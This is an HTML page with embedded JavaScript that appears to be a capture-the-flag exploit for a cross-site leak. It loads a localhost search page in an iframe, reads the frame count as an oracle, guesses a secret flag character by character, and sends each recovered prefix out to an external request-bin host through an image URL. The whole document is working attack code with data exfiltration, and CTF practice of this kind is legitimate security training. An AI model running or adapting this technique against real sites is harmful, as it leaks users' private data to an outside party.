<!DOCTYPE html>
<html>

<body>
  <iframe></iframe>
  <img></img>
  <script>
    const cand = "0123456789abcdef}";
    const iframe = document.querySelector("iframe");
    const img = document.querySelector("img");

    async function loadIframe(url) {
      return new Promise((resolve, reject) => {
        iframe.src = url;
        iframe.onload = () => { 
            if (iframe.contentWindow.frames.length != 0)
                return resolve();
            else
                return reject();
        };
      });
    }

    async function testURL(query){
      try{
        await loadIframe(`http://localhost:8000/search?query=${query}`);
        return true;
      } 
      catch(e){
        return false;
      }
    }
    
    async function exploit() {
      let flag = "DH{";
      while(!flag.includes("}")){
        for (const c of cand) {
          if(await testURL(flag + c)){
            flag += c;
            img.src = "https://zivcheq.request.dreamhack.games/" + flag;
            break;
          }
        }
      }
    }
    exploit();
  </script>
</body>

</html>
